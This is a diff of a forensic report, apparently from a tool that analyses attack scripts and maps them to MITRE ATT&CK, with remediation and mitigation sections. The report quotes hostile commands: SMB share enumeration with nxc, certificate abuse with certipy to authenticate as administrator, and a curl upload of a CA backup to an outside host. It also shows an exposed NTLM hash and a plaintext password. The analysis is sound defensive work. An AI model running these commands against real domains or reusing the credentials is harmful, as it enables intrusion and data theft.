@@ -5,7 +5,7 @@ slopmop report   <folder>
 Summary
   files       17  7 scripts, 9 outputs
   indicators  22  9 Domain, 3 Email, 4 IPv4, 2 MD5, 1 SHA1, 3 URL
-  activities  4
+  activities  5
   tactics     4
   targeted    9   Email addresses 1, Hostnames 4, IP addresses 4
   exposed     24  Passwords and secrets 5, Usernames 6, Email addresses 2, Tenants 1, Devices 6, IP addresses 4
@@ -24,6 +24,7 @@ Timeline   (a block for each intent, from the first of its files to be created u
       watchlist  STORM-0940: 10.20.1.5
 
   [x] Discovery, CredentialAccess     2025-03-01T10:18:00Z to 2025-03-01T10:23:00Z
+      T1135      Network Share Discovery                       TA0007  Discovery
       T1087.004  Account Discovery: Cloud Account              TA0007  Discovery           AML.T0075  Enterprise Resource Discovery
       T1087      Account Discovery                             TA0007  Discovery
       tools      ldapsearch                                    TA0007  Discovery
@@ -60,6 +61,8 @@ Findings
     [i] CloudAccountDiscovery  2 lines  Discovery         T1087.004, AML.T0075
         what  MSOL_0a1b2c3d4e5f AADC01 Account created by Microsoft Azure Active Directory Connect (20250301_101910_step02_users.tsv:2)
               Username: Sync_AADC01_0a1b2c3d4e5f@corpexample.onmicrosoft.com (adsync_1740824865.txt:3)
+    [i] NetworkShareDiscovery  1 line   Discovery         T1135
+        what  nxc smb "$h" -u "$USER" -p "$PASS" -d $DOMAIN --shares | tee -a 20250301_101845_step02_enum.log (20250301_101800_step02_enum.sh:8)
 
 Targeted   (hardcoded values: prior means no earlier output holds it, discovered means one does; subjects: each entity an activity acted on)
   Email addresses (1)
@@ -96,6 +99,9 @@ Targeted   (hardcoded values: prior means no earlier output holds it, discovered
         what  DC_IP=10.20.1.5 (20250301_101800_step02_enum.sh:2)
               certipy find -u "$MSOL_USER@corp.example" -p "$MSOL_PASS" -dc-ip 10.20.1.5 -vulnerable -stdout | tee 20250301_103240_certipy_find.txt (20250301_103200_step05_certs.sh:5)
               certipy auth -pfx "$PFX" -dc-ip 10.20.1.5 -username administrator -domain corp.example > 20250301_104010_step06_auth.txt (20250301_104000_step06_auth.sh:3)
+  Host (1)
+    [i] $h  NetworkShareDiscovery
+        what  NetworkShareDiscovery: nxc smb "$h" -u "$USER" -p "$PASS" -d $DOMAIN --shares | tee -a 20250301_101845_step02_enum.log (20250301_101800_step02_enum.sh:8)
   Url (1)
     [x] https://transfer.example.net/upload  FileUpload
         what  FileUpload: curl -s -T 20250301_104100_ca_backup.p12 https://transfer.example.net/upload (20250301_104500_step07_exfil.sh:4)
@@ -171,7 +177,7 @@ Impact
                username: svc_adsync
                username: svc_backup@corp.example
                email, Microsoft 365: Sync_AADC01_0a1b2c3d4e5f@corpexample.onmicrosoft.com
-      basis    Discovery tools, exposed username, exposed email, exposed tenant, exposed device, exposed ip
+      basis    NetworkShareDiscovery, Discovery tools, exposed username, exposed email, exposed tenant, exposed device, exposed ip
 
 Remediation   (most urgent first)
   [x] Rotate what was read
@@ -200,7 +206,7 @@ Remediation   (most urgent first)
                username: svc_adsync
                username: svc_backup@corp.example
                email, Microsoft 365: Sync_AADC01_0a1b2c3d4e5f@corpexample.onmicrosoft.com
-      basis    Discovery tools, exposed username, exposed email, exposed tenant, exposed device, exposed ip
+      basis    NetworkShareDiscovery, Discovery tools, exposed username, exposed email, exposed tenant, exposed device, exposed ip
 
 Mitigation   (MITRE ATT&CK and ATLAS, for the techniques found)
   [x] M1015 Active Directory Configuration                    T1003, T1649
@@ -234,11 +240,12 @@ Mitigation   (MITRE ATT&CK and ATLAS, for the techniques found)
   [x] M1027 Password Policies                                 T1003
       Set and enforce secure password policies for accounts to reduce the likelihood of unauthorized access.
       exposed  hash of administrator, 10.20.1.5, 10.20.1.23: 8846f7eaee8fb117ad06bdd830b7586c
-  [x] M1028 Operating System Configuration                    T1003, T1087
+  [x] M1028 Operating System Configuration                    T1003, T1087, T1135
       Operating System Configuration involves adjusting system settings and hardening the default configurations of an operating system (OS) to mitigate adversary exploitation and prevent abuse of system functionality.
       exposed  hash of administrator, 10.20.1.5, 10.20.1.23: 8846f7eaee8fb117ad06bdd830b7586c
+               password of svc_backup, DC01, AADC01: Winter2025!
                username: svc_adsync
-      for      AccountDiscovery
+      for      AccountDiscovery, NetworkShareDiscovery
   [x] M1030 Network Segmentation                              T1048
       Network segmentation involves dividing a network into smaller, isolated segments to control and limit the flow of traffic between devices, systems, and applications.
       exposed  hash of administrator, 10.20.1.5, 10.20.1.23: 8846f7eaee8fb117ad06bdd830b7586c
